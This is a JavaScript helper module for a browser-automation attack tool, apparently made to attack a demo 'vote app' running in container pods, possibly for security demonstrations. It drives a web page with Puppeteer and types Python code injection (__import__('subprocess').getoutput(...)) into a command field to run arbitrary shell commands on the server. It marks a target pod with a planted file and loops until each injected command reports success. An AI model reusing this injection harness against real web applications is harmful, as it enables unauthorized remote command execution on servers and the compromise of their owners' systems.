module.exports = {
  get_url: function (options) {
    if(!options['url']){
      console.log("Must supply an vote app URL");
      process.exit(1);
    }
    let url = options['url']
    if(!url.startsWith('http')){
      url = 'http://' + url
    }
    url += '/?hacker=true'
    return url
  },

  get_attack_type: function (options, attacks) {
    if(!options['attack']){
      console.log("Must supply an attack to run");
      process.exit(1);
    }else if(!attacks[options['attack']]){
      console.log('Attack ' + options['attack'] +' is not valid!')
      process.exit(1);
    }
    return options['attack']
  },

  replace_command_with_parameters: function (attack, options){
    // if the attack has parameters run each replacement for each command
    if(attack['parameter'] != undefined){
      paramater = attack['parameter']
      if(!options[paramater['option_key']]){
        console.log('Must provide option: ' + paramater['option_key'])
        process.exit(1);
      }
      for (let key in attack['commands']) {
        attack['commands'][key] = attack['commands'][key].replace(paramater['replace'], options[paramater['option_key']])
      }
    }
    return attack
  },

  clearText: async function (page, id){
    // focus on text area and remove all text
    await page.click(id);
    await page.keyboard.down('Control');
    await page.keyboard.press('KeyA');
    await page.keyboard.up('Control');
    await page.keyboard.press('Backspace');
  },

  run_command_wait_for_ouput: async function(page, command){
    var command_ran = false
    console.log('Command being run: ' + command)
    while(command_ran == false){
      console.log('    Trying to run command on attack pod')
      await module.exports.run_single_command(page, command)

      // wait for 'DONE' text to appear in the 'results' textarea
      await page.waitForFunction('document.querySelector("#result").value.includes("DONE:")', {timeout: 60000});

      // find if the command was run on the attack pod or not
      let resDom = await page.$('#result');
      const text = await page.evaluate(element => element.value, resDom);
      if(text.includes('DONE: success')){
        command_ran = true
        console.log('    Ran command on attack pod!')
        break
      }
    }
  },

  find_or_create_attack_pod: async function (page){
    // if there are multiple pods running this marks one for use for running attack commands
    console.log('Checking for pod ready for attack')
    let commandDom = await page.$('#command')
    var times = 12
    var found = false

    // check to see if there is a pods already setup for attacking
    for(var i=0; i < times; i++){
      console.log('    Checking pods attempt: ' + i + '/' + times)
      let success = await module.exports.run_single_command(page,"ls")

      if(success){
        found = true
        console.log('    Found pod ready for attack')
        break
      }
    }

    // mark pod is one wasn't found
    if(found == false){
      console.log('    Marking pod ready for attack')
      await module.exports.clearText(page, '#command')
      await commandDom.type('__import__("subprocess").getoutput("touch thispod")')
      await page.click('#run-command');
    }
  },

  count: 1,
  verbose_output: async function (page) {
    if(global.verbose){
      await page.screenshot({path: 'pic'+module.exports.count+'.png'});
      module.exports.count = module.exports.count + 1

      const text = await page.evaluate(function() { return document.querySelector('#result').value })
      console.log('------');
      console.log(text);
      console.log('------');
    }
  },

  run_single_command: async function (page, command) {
    command = "[ -f \'./thispod\' ] && (" + command + "; echo \'DONE: success\') || (echo \'DONE: failed\')"

    // clear any existing text from the command/result text areas
    await module.exports.clearText(page, '#command')
    await page.evaluate(() => document.querySelector('#result').innerHTML = "");
    await page.evaluate(function() { return document.querySelector('#result').value = "" })

    // enter the command to run
    let commandDom = await page.$('#command')
    await commandDom.type('__import__("subprocess").getoutput("'+ command +'")')

    // run the command
    await page.click('#run-command');

    // wait for 'DONE' to show up in output
    await page.waitForFunction('document.querySelector("#result").value.includes("DONE:")');

    await module.exports.verbose_output(page)

    let resDom = await page.$('#result')
    const text = await page.evaluate(element => element.value, resDom);
    if(text.includes('DONE: success')){
      return true
    }else{
      return false
    }
  },

  run_commands: async function (page, commands){
    for(command of commands){
      await module.exports.run_command_wait_for_ouput(page, command)
    }
  },

};
